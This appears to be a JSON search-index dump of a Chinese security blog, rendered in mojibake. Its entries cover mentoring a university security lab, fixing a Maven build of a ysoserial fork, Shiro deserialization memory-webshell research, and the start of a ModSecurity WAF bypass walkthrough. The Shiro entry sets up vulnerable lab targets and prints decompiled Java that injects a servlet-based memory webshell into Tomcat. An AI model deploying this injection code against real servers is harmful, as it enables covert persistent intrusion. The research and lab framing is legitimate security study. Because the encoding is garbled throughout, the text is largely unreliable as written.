    "content"  : "è¿‡å®Œå¹´å›åˆè‚¥å·²ç»æ¥è¿‘ä¸€ä¸ªæœˆä¹‹ä¹…äº†ï¼Œä»Šå¹´æ˜¯æœ¬å‘½å¹´ï¼Œä¹Ÿå¸Œæœ›è‡ªå·±èƒ½å¤Ÿèƒ½å¤Ÿæ¯”20å¹´æ›´åŠ åŠªåŠ›ã€‚å›äº†å…¬å¸å°±æŒ‰ç…§è®¡åˆ’å¿™äº›æœ‰æ„ä¹‰çš„ï¼šä¸€åˆ‡æ­£åœ¨æœ‰æ¡ä¸ç´Šçš„è¿›è¡Œç€ï¼šæŒ‰ç…§æ–°å¹´çš„è§„åˆ’ï¼Œè¿‡æ¥éœ€è¦æ²‰æ·€çš„ä¾¿æ˜¯Shiroæ¡†æ¶ã€‚è¿‡å®Œå¹´å›æ¥å°±é¢ä¸´ç€æŠ¤ç½‘ï¼Œåœ¨20å¹´é ç€è¿™ä¸ªä¸ºå…¬å¸æŠ¤ç½‘â€œæ‰“ä¸‹äº†ä¸€ç‰‡æ±Ÿå±±â€ï¼Œä»Šå¹´åº”è¿›ä¸€æ­¥ç†è§£ï¼›è¯´äº›æ²¡ç”¨çš„ï¼šè¿‡å¹´å›æ¥åï¼Œå¿™é‡Œå·é—²ä¸å­¦æ ¡ç½‘å®‰å®éªŒå®¤çš„å­©å­ä»¬å¼€äº†ä¸€æ¬¡çº¿ä¸‹äº¤æµä¼šï¼Œäº¤æµä¼šçš„ä¸»è¦å†…å®¹å°±æ˜¯æ€»ç»“å¯’å‡ä»¥æ¥çš„å­¦ä¹ è¿‡ç¨‹å’Œå¿ƒå¾—æ±‡æŠ¥ï¼›å› ä¸ºå¹´çºªè¾ƒå°ï¼ŒåŸºæœ¬éƒ½æ˜¯åˆšå¤§ä¸€ã€å¤§äºŒï¼Œæ‰€ä»¥å¶å°”ä¹Ÿè¦è¿›è¡Œå¤§å­¦ç”Ÿæ´»å›°æ‰°çš„è§£æƒ‘ï¼›ç½‘å®‰å®éªŒå®¤é˜Ÿä¼å®‰æ’ï¼šå¯¼å¸ˆï¼šé˜Ÿä¼çµé­‚ï¼›æˆ‘çš„è§’è‰²ï¼šæˆ‘æƒ³ï¼Œæˆ‘åœ¨è¿™ä¸ªé˜Ÿä¼é‡Œæ‰®æ¼”çš„è§’è‰²åº”è¯¥æ˜¯ä½œä¸ºè¡Œä¸šâ€œè¿‡æ¥äººâ€å¯¹ä»–ä»¬çš„å­¦ä¹ è®¡åˆ’è¿›è¡Œæœ‰æ•ˆçš„ç›‘ç£å’Œå»ºè®®ã€‚æ”»å‡»é˜Ÿä¼ï¼ˆçº¢é˜Ÿï¼‰è¦æ±‚ï¼š1.ç†Ÿæ‚‰å„ç§æ¼æ´ç‰¹å¾å’Œåˆ©ç”¨åŸç†ï¼›2.èƒ½å¤ŸåŸºæœ¬è¯»æ‡‚POCä»£ç æ‰€è¿›è¡Œçš„æ“ä½œï¼Œå¹¶è‡ªå·±æœ‰ä¸€å®šçš„ç¼–ç¨‹èƒ½åŠ›å’Œä»£ç å®¡è®¡èƒ½åŠ›ï¼›3.ç†Ÿæ‚‰å¸‚é¢ä¸»æµWAFçš„è¯†åˆ«ã€WAFè§„åˆ™æ¢æµ‹ã€ç»•è¿‡ä»¥åŠæ”»å‡»WAFåçš„èµ„äº§ã€‚é˜²å®ˆé˜Ÿä¼ï¼ˆè“é˜Ÿï¼‰è¦æ±‚ï¼š1.ç†Ÿæ‚‰å„ç±»æ¼æ´å½¢æˆåŸå› ã€åŠæ—¶è·Ÿè¿›äº’è”ç½‘ä¸Šçˆ†å‡ºçš„å„ç§0dayã€1dayã€Ndayï¼Œå¹¶å¯¹é¢‘ç¹çˆ†å‡ºæ¼æ´çš„ç»„ä»¶æœ‰æ·±åˆ»çš„ç†è§£ï¼Œå¦‚WebLogicååºåˆ—åŒ–ã€Shiroååºåˆ—åŒ–ã€å„ç§ï¼ˆSQLã€æ¨¡ç‰ˆï¼‰æ³¨å…¥ç­‰ç­‰ï¼›2.ç†Ÿæ‚‰ä¸»æµæ“ä½œç³»ç»ŸLinuxã€Windowsçš„å·¥ä½œåŸç†å¦‚è½¯ä»¶ç¼–è¯‘å®‰è£…èƒ½åŠ›ã€é›†ç¾¤çš„ç‹¬ç«‹è¿ç»´èƒ½åŠ›ä»¥åŠå®‰å…¨äº‹ä»¶æœ”æºèƒ½åŠ›ï¼›3.èƒ½å¤Ÿåšåˆ°ç‹¬ç«‹éƒ¨ç½²å®‰å…¨ï¼ˆå®¡è®¡ï¼‰å¹³å°æˆ–å®‰å…¨å·¥å…·ï¼Œå¦‚WAFä»¥åŠWAFå·¥ä½œæ¶‰åŠçš„è§„åˆ™åº“ç¼–å†™ã€‚æ•°æ®æŒ–æ˜ç±»ï¼Œæ¶‰åŠåˆ°ç®—æ³•åº”ç”¨ç­‰ï¼›ä¸å¤šè¯´ã€‚å¼€å‘ç±»ï¼›ä¸å¤šè¯´ã€‚ç°å­˜é—®é¢˜å¦‚ä¸‹ï¼šå¦‚ä½•åœ¨ç°é˜¶æ®µçš„ç½‘å®‰ç¯å¢ƒä¸‹ï¼Œæ‰“é€ å‡ºä¸€æ”¯ä¸“ä¸šåŒ–å›¢é˜Ÿï¼š|__1ã€ç½‘å®‰å®éªŒå®¤æ˜¯å¦èƒ½å¤Ÿæˆç«‹CTFæˆ˜é˜Ÿï¼Ÿ|__2ã€ä¼ä¸šå®‰å…¨ä¸“ä¸šåŒ–å®‰å…¨æœåŠ¡å›¢é˜Ÿï¼Ÿé—®é¢˜1ã€é’ˆå¯¹å¤ºæ——æˆ˜é˜Ÿï¼Œæˆ‘æƒ³ï¼šå½“ä¸‹çš„æ‹¥æœ‰çš„èµ„æºä¾¿æ˜¯æœ€å¥½çš„æœºä¼šï¼šèƒ½å¤Ÿæœ‰æœ¬ä¸“ä¸šå¯¼å¸ˆçš„æŒ‡å¯¼åŒæ—¶ï¼Œæœ‰ä¸€å®šç”Ÿæºæ¥è¿›è¡Œå¤ºæ——æ¯”èµ›é€‰å–é˜Ÿé•¿æ¥ä¿è¯æˆ˜é˜Ÿçš„å‡èšåŠ›å’Œå›¢é˜Ÿæ´»åŠ›ï¼›ç®¡ç†å›¢é˜Ÿåº”å½“é‡‡å–æ¯”èµ›å†›äº‹åŒ–ç®¡ç†ï¼›åŒ…æ‹¬æ™¨è·‘ã€å†…éƒ¨æ”»é˜²è®­ç»ƒèµ›ç”Ÿæºçš„åŒ¹é…é—®é¢˜ï¼šåœ¨ç”Ÿæºç­›é€‰æ—¶å­˜åœ¨çš„é—®é¢˜ï¼šæˆ–è®¸åœ¨å®éªŒå®¤çš„ç”Ÿæºé€‰æ‹©ä¸­ï¼Œåº”å½“è®©æ‰€æœ‰æœ‰è¯¥è¡Œä¸šå…´è¶£çš„æ–°ç”Ÿéƒ½åŠ å…¥è¿›æ¥ï¼Œæˆ‘å§‹ç»ˆç›¸ä¿¡çš„æ˜¯ï¼Œå¤§å­¦ç”Ÿæ´»æ˜¯è‡ªèº«å…´è¶£çš„å‘æ˜è¿‡ç¨‹ï¼Œå¯¹ä»–ä»¬çš„åŸ¹å…»è¿‡ç¨‹åŒæ—¶ä¹Ÿæ˜¯è€ƒæ ¸è¿‡ç¨‹ï¼›å› ä¸ºå½“ä¸‹å­˜åœ¨çš„é—®é¢˜è¾ƒä¸ºæ˜æ˜¾ã€‚éƒ¨åˆ†å¹´è½»æ–°ç”Ÿï¼Œæ— æ³•åœ¨å›¢é˜Ÿçš„å¸¦è·‘ä¸‹è·Ÿä¸ŠèŠ‚å¥ï¼Œè¸¢å‡ºï¼›å°éƒ¨åˆ†è‡ªèº«é—®é¢˜äº§ç”Ÿå„ç§é—®é¢˜"
  },

  {
    "title"    : "å®‰å…¨ä¸å¼€å‘ä¹‹ï¼šMavenæ„å»ºæ’é”™",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/ALL-mvn-build-errors/",
    "date"     : "Mar 10, 2021",
    "content"  : "å®‰å…¨ä¸å¼€å‘ä¹‹ï¼šMavenæ„å»ºæ’é”™é›¶ï¼šYsoserialé­”æ”¹é¡¹ç›®Bythreedr3am.Mavenæ„å»ºæœ€è¿‘åœ¨ç ”ç©¶å†…å­˜é©¬ï¼›æœ‰å¹¸ç”Ÿäºä¿¡æ¯çˆ†ç‚¸çš„æ—¶ä»£ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æœç´¢å¼•æ“æœç´¢åˆ°éœ€è¦çš„èµ„æ–™ã€‚2021å¹´3æœˆ31æ—¥æ˜ŸæœŸä¸‰10æ—¶22åˆ†20ç§’CSTåœ¨åŸä»“åº“ä¸­ï¼šoriginhttps://github.com/threedr3am/ysoserial.git(fetch)originhttps://github.com/threedr3am/ysoserial.git(push)å…‹éš†ä¸‹æ¥çš„é¡¹ç›®æ— æ³•æ„å»ºæˆåŠŸï¼›ç»è¿‡æ’é”™ç°pushä»“åº“ä¸Šçº¿ã€‚æ„Ÿè°¢@threedr3amå¸ˆå‚…å¼€æºçš„ä»£ç ï¼›è¿›ä¸€æ­¥äº†è§£æ’é”™æ­¥éª¤å¾è¾ˆå½“ç ¥ç ºå‰è¡Œï¼›è¿›ä¸€æ­¥äº†è§£å…³äºå†…å­˜é©¬çš„å¼€æºé¡¹ç›®0x01ï¼š[ERROR]é”™è¯¯:æ‰¾ä¸åˆ°ç¬¦å·#ç«™åœ¨å·¨äººçš„è‚©è†€ä¸Šgitclonehttps://github.com/threedr3am/ysoserial.gitcdysoserial#æ ¹æ®readme.mdæç¤ºè¿›è¡Œå‘½ä»¤æ„å»º#RequiresJava1.7+andMaven3.x+mvncleanpackage-DskipTestsä¸å‡ºæ„å¤–çš„è¯ï¼Œç­‰ä¸‹è½½å®Œpomæ–‡ä»¶ä¸­çš„æ‰€æœ‰ä¾èµ–ï¼Œå°±ä¼šæŠ¥é”™æ„å»ºå¤±è´¥ï¼š[ERROR]COMPILATIONERROR:[INFO]-------------------------------------------------------------[ERROR]/Users/bin4xin/tools/bin4xin/code/tomcat/ysoserial/ysoserial-failed/src/main/java/ysoserial/payloads/FileUpload1.java:[11,35]é”™è¯¯:æ‰¾ä¸åˆ°ç¬¦å·[ERROR]ç¬¦å·:ç±»DeferredFileOutputStreamä½ç½®:ç¨‹åºåŒ…org.apache.commons.io.output/Users/bin4xin/tools/bin4xin/code/tomcat/ysoserial/ysoserial-failed/src/main/java/ysoserial/payloads/FileUpload1.java:[12,35]é”™è¯¯:æ‰¾ä¸åˆ°ç¬¦å·ä¸€èˆ¬æ¥è¯´ï¼Œmvnæ„å»ºé¡¹ç›®æŠ¥é”™æ’é”™æµç¨‹å¦‚ä¸‹ï¼š1ã€æºç è°ƒç”¨çš„ä¾èµ–åº“ï¼šæˆ‘ä»¬å¯ä»¥ä»ä¸Šé¢çš„æŠ¥é”™çœ‹å‡ºæŠ¥é”™çš„æ–‡ä»¶src/main/java/ysoserial/payloads/FileUpload1.javaå’Œä¾èµ–åŒ…åç§°org.apache.commons.io.outputï¼Œç›´æ¥å®šä½åˆ°è¯¥æ–‡ä»¶ä½ç½®æŸ¥çœ‹ï¼šå¦‚ä¸Šï¼Œæ·»åŠ ä¾èµ–ï¼›æç¤ºæŠ¥é”™æ˜¯åœ¨org.apache.commons.io.outputä¸‹çš„è°ƒç”¨åŒ…ï¼Œå³è¾¹è¿˜æœ‰æºç è°ƒç”¨å­˜åœ¨é—®é¢˜ï¼Œçœ‹åˆ°è¿™æ ·çš„æƒ…å†µä¸è¦æ…Œï¼ŒIDEAç»™æˆ‘ä»¬æä¾›äº†è§£å†³æ–¹æ¡ˆï¼šå¿«æ·é”®shift+option+enterï¼›æˆ–æ‚¬æµ®é¼ æ ‡åœ¨ç¼ºå¤±çš„ã€çˆ†çº¢çš„ä¾èµ–ç¨‹åºåŒ…ä¸Šå¦‚org.apache.commons.io.output-&gt;AddMavenDependencyå‘¼å‡ºå³è¾¹åŠŸèƒ½æ¡†ã€ŒMavenArtifactSearchã€æ·»åŠ ä¸Šä¾èµ–åå°±OKäº†ï¼Œä½†æ˜¯è¿˜æ˜¯æ— æ³•æ„å»ºæˆåŠŸï¼›å½“Mavenæ‰§è¡Œä¸€ä¸ªå¸¦æœ‰å­æ¨¡å—çš„é¡¹ç›®çš„æ—¶å€™ï¼ŒMavené¦–å…ˆè½½å…¥çˆ¶POM,ç„¶åå®šä½æ‰€æœ‰çš„å­æ¨¡å—POMã€‚Mavenç„¶åå°†æ‰€æœ‰è¿™äº›é¡¹ç›®çš„POMæ”¾å…¥åˆ°ä¸€ä¸ªç§°ä¸ºMavenååº”å †ï¼ˆReactorï¼‰çš„ä¸œè¥¿ä¸­ï¼Œç”±å®ƒè´Ÿè´£åˆ†ææ¨¡å—ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œä»¥ç¡®ä¿ç›¸äº’ç‹¬ç«‹çš„æ¨¡å—èƒ½ä»¥é€‚å½“çš„é¡ºåºè¢«ç¼–è¯‘å’Œå®‰è£…æ‰€ä»¥ç»§ç»­å¾€ä¸‹æ¥çœ‹POMï¼š2ã€POMæ–‡ä»¶ä¾èµ–ï¼šPOM(ProjectObjectModelï¼Œé¡¹ç›®å¯¹è±¡æ¨¡å‹)æ˜¯Mavenå·¥ç¨‹çš„åŸºæœ¬å·¥ä½œå•å…ƒï¼Œæ˜¯ä¸€ä¸ªXMLæ–‡ä»¶ï¼ŒåŒ…å«äº†é¡¹ç›®çš„åŸºæœ¬ä¿¡æ¯ï¼Œç”¨äºæè¿°é¡¹ç›®å¦‚ä½•æ„å»ºï¼Œå£°æ˜é¡¹ç›®ä¾èµ–ï¼Œç­‰ç­‰ã€‚æ‰§è¡Œä»»åŠ¡æˆ–ç›®æ ‡æ—¶ï¼ŒMavenä¼šåœ¨å½“å‰ç›®å½•ä¸­æŸ¥æ‰¾POMã€‚å®ƒè¯»å–POMï¼Œè·å–æ‰€éœ€çš„é…ç½®ä¿¡æ¯ï¼Œç„¶åæ‰§è¡Œç›®æ ‡ã€‚POMä¸­å¯ä»¥æŒ‡å®šä»¥ä¸‹é…ç½®ï¼š-é¡¹ç›®ä¾èµ–-æ’ä»¶-æ‰§è¡Œç›®æ ‡-é¡¹ç›®æ„å»ºprofile-é¡¹ç›®ç‰ˆæœ¬-é¡¹ç›®å¼€å‘è€…åˆ—è¡¨-ç›¸å…³é‚®ä»¶åˆ—è¡¨ä¿¡æ¯æˆ‘ä»¬å®šä½åˆ°é¡¹ç›®çš„pom.xmlæ–‡ä»¶ï¼Œçœ‹çœ‹æŠ¥é”™pomä¸æˆåŠŸpomå¯¹æ¯”ï¼šæˆ‘ä»¬ä¹ŸåŒæ ·å¯ä»¥çœ‹åˆ°ï¼Œå·¦è¾¹pomæ–‡ä»¶ä¸€ç‰‡çˆ†çº¢ï¼›æ¥å°è¯•è§£å†³ä»¥ä¸‹ï¼šè§£å†³æ–¹æ³•ï¼šä¸€èˆ¬æ ‡ç­¾çˆ†çº¢çš„ï¼Œè§£å†³åŠæ³•éƒ½æ˜¯å»mavenä»“åº“é‡Œå»æŸ¥çœ‹å¯¹åº”ä¾èµ–çš„ç‰ˆæœ¬å·ï¼ŒæŸ¥åˆ°å¯¹åº”çš„mavenä»“åº“çš„ç‰ˆæœ¬å·ä¿®æ”¹å³å¯ï¼›è¿›å…¥AliMavensearchè¿›ä¸€æ­¥äº†è§£å¦‚æœæ ‡ç­¾å†…æ•´ä¸ªä¾èµ–å‡ºç°çˆ†çº¢é”™è¯¯ï¼Œä¸€èˆ¬æ˜¯å°è¯•å»åœ¨IDEAé‡Œå°è¯•å¯¼å…¥libåº“æŸ¥çœ‹æ˜¯å¦ç»§ç»­æŠ¥é”™ï¼Œå¦‚æœæ— æ³•æˆåŠŸçš„è¯éœ€è¦è‡ªå·±æ‰‹åŠ¨å¯¼å…¥jaråŒ…ã€‚#å†æ¬¡æ„å»ºmvnclean-DskipTestsmvncleanpackage-DskipTestsÂ·Â·Â·ls-latargettotal119144drwxr-xr-x11bin4xinstaff35233109:56.drwxrwxr-x@18bin4xinstaff57633109:56..drwxr-xr-x2bin4xinstaff6433109:56archive-tmpdrwxr-xr-x3bin4xinstaff9633109:56classesdrwxr-xr-x3bin4xinstaff9633109:56generated-sourcesdrwxr-xr-x3bin4xinstaff9633109:56generated-test-sourcesdrwxr-xr-x3bin4xinstaff9633109:56maven-archiverdrwxr-xr-x3bin4xinstaff9633109:56maven-statusdrwxr-xr-x3bin4xinstaff9633109:56test-classes-rw-r--r--1bin4xinstaff6049701933109:56ysoserial-0.0.6-SNAPSHOT-all.jar-rw-r--r--1bin4xinstaff19380433109:56ysoserial-0.0.6-SNAPSHOT.jarè‡³æ­¤ï¼Œæˆ‘ä»¬çœ‹åˆ°å·²ç»æ„å»ºå‡º0.0.6ç‰ˆæœ¬çš„jaråŒ…ã€‚0x02ï¼šæ€»ç»“#ç‰¢éªšå¤ªç››é˜²è‚ æ–­ï¼Œé£ç‰©é•¿å®œæ”¾çœ¼é‡ã€‚1ã€MVNæºç æ„å»ºå¯¼å…¥libåº“ï¼›2ã€ä¿®æ”¹POMæ–‡ä»¶å¯¹åº”çš„ä¾èµ–ã€‚ä»¥ä¸Šã€‚"
  },

  {
    "title"    : "åŸºäºå†…å­˜çš„Shiroæ¡†æ¶Webshellæ”»å‡»ç ”ç©¶",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Research-on-Webshell-Attack-of-Shiro-Framework-Based-on-Memory/",
    "date"     : "Mar 10, 2021",
    "content"  : "åŸºäºå†…å­˜çš„Shiroæ¡†æ¶Webshellæ”»å‡»ç ”ç©¶âœ…Shiroæ¡†æ¶éƒ¨ç½²IDEAtomcatè°ƒè¯•éƒ¨ç½²dockercomposeâœ…Shiroæ¡†æ¶æ”»å‡»æ‰‹åŠ¨pocå·¥å…·pocâœ…åŸºäºtomcatçš„é€šç”¨å›æ˜¾tomcatå†°èå†…å­˜é©¬åˆ©ç”¨åŸç†æ”»å‡»æµ‹è¯•âœ…ç»™ğŸ‘´è¿ï¼é›¶ï¼šShiroæ¡†æ¶éƒ¨ç½²ç°å¦‚ä»Šéƒ¨ç½²ä¸€ä¸ªé¶åœºçš„æ–¹æ³•æœ‰å¾ˆå¤šï¼Œå–å†³äºä¸ªäººå–œå¥½å’Œéœ€æ±‚ï¼›æˆ‘ç»“åˆä¸ªäººèƒ½åŠ›åšå‡ºäº†ä¸€äº›æ€»ç»“ï¼šç‰¹ç‚¹\\éƒ¨ç½²åŠæ³•docker-composeIDEAtomcatè°ƒè¯•éƒ¨ç½²Docker+IDEAå¿«æ·ç¨‹åº¦å‡ æ¡å‘½ä»¤å¿«æ·éƒ¨ç½²éœ€å¼€æ”¾è°ƒè¯•ç«¯å£+tomcatwaråŒ…(å¦‚æ— åˆ™éœ€æºç æ„å»º)ä½ æ‡‚çš„èƒ½å¦è°ƒè¯•ââœ…âœ…è‡ªå®šä¹‰é¶åœºï¼ˆå¦‚é¡µé¢ï¼‰ââœ…âœ…#0x01ï¼šIDEAtomcatè°ƒè¯•éƒ¨ç½²æœ¬ç¯‡æ–‡ç« ä¼šä¾§é‡æè¿°å¦‚ä½•è¿›è¡Œé’ˆå¯¹IDEAçš„tomcatè°ƒè¯•éƒ¨ç½²ï¼›å…‹éš†æºç ä»¥shiro-721ä¸ºä¾‹ï¼šgitclonehttps://github.com/apache/shiro.gitcdshirogitcheckoutshiro-root-1.4.1mvninstallcdsamples/webmvninstallæ‰¾åˆ°{path-to-shiro}/samples/web/targetç›®å½•ä¸‹çš„waråŒ…å¤åˆ¶åˆ°tomcatwebappsç›®å½•ä¸‹ï¼š$treetargetÂ·Â·â”‚Â Â â”œâ”€â”€index.jspâ”‚Â Â â”œâ”€â”€login.jspâ”‚Â Â â”œâ”€â”€logout.jspâ”‚Â Â â””â”€â”€style.cssâ”œâ”€â”€samples-web-1.4.1.war$cpsamples/web/target/samples-web-1.4.1.war{path-to-tomcat}/webapps/å¼€æ”¾tomcatè°ƒè¯•ç«¯å£ï¼šæ‰¾åˆ°bin/catalina.shæ–‡ä»¶ä¸­çš„JAVA_OPTSï¼ˆä¼šæœ‰å¤šä¸ªï¼‰ï¼Œä¿®æ”¹å¦‚ä¸‹ï¼šJAVA_OPTS=\"$JAVA_OPTS$JSSE_OPTS\"#RegistercustomURLhandlers#DothisheresocustomURLhandles(specifically'war:...')canbeusedinthesecuritypolicyJAVA_OPTS=\"$JAVA_OPTS-Djava.protocol.handler.pkgs=org.apache.catalina.webresources\"CATALINA_OPTS=\"-Xdebug-Xrunjdwp:transport=dt_socket,address=5555,suspend=n,server=y\"#ä¸Šé¢çš„CATALINA_OPTSä¸ºæ–°å¢ï¼›addressä¸ºè°ƒè¯•ç«¯å£ï¼Œå¯è‡ªè¡Œæ›´æ”¹ã€‚bin/startup.shå¯åŠ¨ï¼Œçœ‹åˆ°ä»¥ä¸‹æ—¥å¿—æ‰“å°åˆ™å¼€æ”¾è°ƒè¯•æˆåŠŸï¼š$tail-flogs/catalina.outListeningfortransportdt_socketataddress:555510-Mar-202109:51:16.763ä¿¡æ¯[main]org.apache.catalina.startup.VersionLoggerListener.logServer.æœåŠ¡å™¨ç‰ˆæœ¬:ApacheTomcat/8.5.57Â·Â·Â·10-Mar-202109:51:16.769ä¿¡æ¯[main]org.apache.catalina.startup.VersionLoggerListener.logå‘½ä»¤è¡Œå‚æ•°ï¼š-Xdebug10-Mar-202109:51:16.769ä¿¡æ¯[main]org.apache.catalina.startup.VersionLoggerListener.logå‘½ä»¤è¡Œå‚æ•°ï¼š-Xrunjdwp:transport=dt_socket,address=5555,suspend=n,server=yIDEA+tomcatè°ƒè¯•ï¼šIDEAé…ç½®ï¼ˆæ·»åŠ serveræ—¶ä¸ºTomcatServer-&gt;Remoteï¼‰ï¼šå¦‚ä¸‹å›¾ï¼ŒåŠ ä¸Šhome.jspæ–­ç‚¹åè¿›è¡Œhttpè¯·æ±‚ï¼Œå¯ä»¥çœ‹åˆ°IDEAä¸­è¿”å›çš„framesè¯¦æƒ…ï¼›è¿™æ ·åŸºæœ¬ä¸Šä¸€ä¸ªåŸºæœ¬çš„IDEA+tomcatçš„è°ƒè¯•é…ç½®è¿‡ç¨‹åŸºæœ¬å°±å®Œæˆäº†ï¼Œå½“ç„¶ï¼Œè¿™åªæ˜¯è°ƒè¯•å‰çš„å‡†å¤‡å·¥ä½œï¼Œå¤§å®¶å¤šç»ƒä¹ å‡ æ¬¡ï¼ŒåŸºæœ¬ä¸Šå°±èƒ½å¤Ÿç†Ÿç»ƒæŒæ¡ï¼›è€Œæœ€é‡è¦çš„ä»¥åŠæœ€éš¾çš„å…¶å®æ˜¯è°ƒè¯•é˜¶æ®µï¼Œè°ƒè¯•è¿‡ç¨‹ä¸­çš„ä¸€äº›æŠ€å·§å’Œèƒ½åŠ›æ˜¯åœ¨ä¸€æ¬¡æ¬¡çš„å®è·µä¸­æ²‰æ·€ä¸‹æ¥çš„ï¼Œåœ¨è¿™é‡Œä»…ä»…å½“ä½œæŠ›ç –å¼•ç‰ï¼Œä¸åšèµ˜è¿°ã€‚#0x02ï¼šdockercomposeéƒ¨ç½²å‡†å¤‡å·¥ä½œæ ¹æ®ä¸åŒæ“ä½œç³»ç»Ÿä¸‹è½½å®‰è£…dockerï¼›å®‰è£…python-&gt;pip-&gt;docker-composeï¼Œæ•™ç¨‹è‡ªè¡Œæœç´¢:)ä¸‹è½½é¶åœºvulhubbasedondockerï¼š$gitclonehttps://github.com/vulhub/vulhub.git$cdvulhub/shiro/CVE-2016-4437/$docker-composeup-dç­‰å¾…å¯åŠ¨å³å¯ã€‚ä¸€ï¼šShiroæ¡†æ¶æ”»å‡»pocä»£ç ç”Ÿæˆæ”»å‡»cookieå¯ä»¥å‚è€ƒä¹‹å‰çš„æ–‡ç« ï¼š1x01ï¼šæ‰‹åŠ¨pocåˆ†äº«ï¼šDifferentShiroFrameworkdeserializationanalysisideas#howtopoc1x02ï¼šå·¥å…·pocåˆ†äº«ï¼šDifferentShiroFrameworkdeserializationanalysisideas#éªŒè¯äºŒï¼šåŸºäºtomcatçš„é€šç”¨å›æ˜¾ä¹‹å†°èå†…å­˜é©¬è¿™ä¸€å°èŠ‚ç”±äºä¸ªäººæ°´å¹³æœ‰é™ï¼Œä¸èƒ½åƒå„ä½å¸ˆå‚…ä¸€æ ·ä»tomcatservletç­‰å±‚é¢ä¸€æ¢ç©¶ç«Ÿï¼Œæˆ‘å°½é‡ä½¿ç”¨ç®€æ´çš„è¯­è¨€å†™å‡ºæˆ‘çš„ç†è§£ï¼›#2x01ï¼šæ”»å‡»æµ‹è¯•å·¥å…·ç›´æ¥é€‰æ‹©â€å†°è2_Tomcatâ€ï¼Œæ‰§è¡Œæ³¨å…¥ï¼›httpå‘åŒ…è¯·æ±‚å¦‚ä¸‹ï¼šæˆ‘ä»¬å¯ä»¥çœ‹åˆ°HTTPè¯·æ±‚ä¸ºPOSTè¯·æ±‚p&amp;path&amp;dyæ•°æ®ï¼›åŒæ—¶headerä¸­åŠ å…¥äº†rememberMeCookieï¼›åˆ†æï¼šCookieæ˜¯ä½œä¸ºååºåˆ—åŒ–çš„å…¥å£ï¼Œdyå‚æ•°åº”è¯¥æ˜¯å†™å…¥å†…å­˜çš„å‘½ä»¤åŒæ—¶æœ€åè¿”å›dynamicinjectsuccessï¼›æ³¨å…¥æˆåŠŸæ•ˆæœï¼š#2x02ï¼šåˆ©ç”¨åŸç†æˆ‘ä»¬æŠŠåˆ©ç”¨å·¥å…·çš„jaråŒ…æ‰”è¿›åç¼–è¯‘è½¯ä»¶å®šä½åˆ°BehOldDemoServlert.classï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ä»£ç æ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼špublicvoiddynamicAddServlet(ServletContextservletContext)throwsException{Methodmethod;StringwrapperName=this.path;ApplicationContextFacadeapplicationContextFacade=(ApplicationContextFacade)servletContext;FieldapplicationContextField=applicationContextFacade.getClass().getDeclaredField(\"context\");applicationContextField.setAccessible(true);ApplicationContextapplicationContext=(ApplicationContext)applicationContextField.get(applicationContextFacade);FieldstandardContextField=applicationContext.getClass().getDeclaredField(\"context\");standardContextField.setAccessible(true);StandardContextstandardContext=(StandardContext)standardContextField.get(applicationContext);ObjectnewWrapper=invoke(standardContext,\"createWrapper\",(Object[])null);invoke(newWrapper,\"setName\",newObject[]{wrapperName});setFieldValue(newWrapper,\"instance\",this);Class&lt;?&gt;containerClass=Class.forName(\"org.apache.catalina.Container\",false,standardContext.getClass().getClassLoader());ObjectoldWrapper=invoke(standardContext,\"findChild\",newObject[]{wrapperName});if(oldWrapper!=null)standardContext.getClass().getDeclaredMethod(\"removeChild\",newClass[]{containerClass});standardContext.getClass().getDeclaredMethod(\"addChild\",newClass[]{containerClass}).invoke(standardContext,newObject[]{newWrapper});try{method=standardContext.getClass().getMethod(\"addServletMappingDecoded\",newClass[]{String.class,String.class});}catch(Exceptionvar9){method=standardContext.getClass().getMethod(\"addServletMapping\",newClass[]{String.class,String.class});}method.invoke(standardContext,newObject[]{this.path,wrapperName});init((ServletConfig)getFieldValue(newWrapper,\"facade\"));}"
  },

  {
    "title"    : "Mod-Waf-Bypass-Walkthrough",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Mod-Waf-Bypass-Walkthrough/",
    "date"     : "Jan 10, 2021",
    "content"  : "ã€Œåˆ†äº«ã€ModsecWAFï¼šè€ç‰Œå¼€æºwafçš„ç»•è¿‡å†ç¨‹é›¶ï¼šè¿å–Šä¸‰å£°ã€ŒWAFã€0x01æ‹¿æ¥WAFä¾ç¨€è®°å¾—é«˜ä¸­çš„ä¸€ä½ç‰©ç†è€å¸ˆçš„ä¸€æ®µè¯ï¼Œå°±æ‹¿è¿™æ®µè¯æ¥å¼€å§‹å§ï¼›èƒŒæ™¯æ˜¯å½“æ—¶åˆšå­¦ç‰©ç†è¯¾ç¨‹ï¼Œå¾ˆå¤šäººå­¦ä¼šç‰©ç†å…¬å¼ä»…é™äºä¼šç”¨ï¼Œä»–ä»¬åœ¨è¯¾å ‚ä¸Šå¯¹æˆ‘ä»¬çš„ç‰©ç†è€å¸ˆè¡¨è¾¾å‡ºäº†ç„¦è™‘ã€‚å½“ç„¶ï¼Œç ”ç©¶ç”Ÿå­¦å†çš„ç‰©ç†è€å¸ˆå¯¹äºè¿™ç§å­¦ä¹ ä¸Šçš„å›°æ‰°å¿…ç„¶æ˜¯ç»å†è¿‡ï¼Œç„¶åæå‡ºäº†ä¸‹é¢çš„è§‚ç‚¹ï¼ŒåŸè¯è®°ä¸å¤ªæ¸…äº†ï¼Œæ‰€ä»¥åªèƒ½å¤§æ¦‚è¡¨è¿°å‡ºæ„æ€ï¼šæˆ‘çŸ¥é“ä½ ä»¬ç°åœ¨æœ‰äº›è¿·èŒ«ï¼Œå½“ç„¶ä¹Ÿæ˜¯æ­£å¸¸çš„ã€‚ä½†æ˜¯ä½ ä»¬è¦æƒ³åœ¨æŸäº›é¢†åŸŸä¸Šæœ‰æ‰€å»ºæ ‘ã€çªç ´ï¼Œå°±è¦å­¦ä¼šç«™åœ¨å·¨äººçš„è‚©è†€ä¸Šçœ‹è¿™ä¸ªä¸–ç•Œï¼Œé²è¿…æå‡ºçš„æ‹¿æ¥ä¸»ä¹‰æˆ‘è§‰å¾—å¾ˆé€‚åˆç”¨æ¥å­¦ç‰©ç†ï¼›ä¸ç®¡è¿™äº›ç‰©ç†å…¬å¼ä¸ºä»€ä¹ˆæ˜¯è¿™æ 